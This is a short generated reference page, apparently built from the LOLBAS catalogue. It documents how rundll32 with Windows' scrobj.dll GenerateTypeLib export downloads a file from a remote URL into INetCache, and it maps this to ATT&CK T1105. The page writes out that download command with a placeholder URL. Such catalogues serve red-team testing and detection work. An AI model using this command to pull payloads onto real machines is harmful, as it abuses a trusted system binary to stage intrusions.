---
parsed_by: focuslocust
source: commands
type: generated
---
# Scrobj.dll Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Scrobj.dll

Tool page: [Scrobj.dll](../../tools/windows/scrobj.dll.md)

### Download file from remote location.

```text
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
```

Description:

Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Scrobj.yml` |
| Evidence | Command preserved from source parser. |
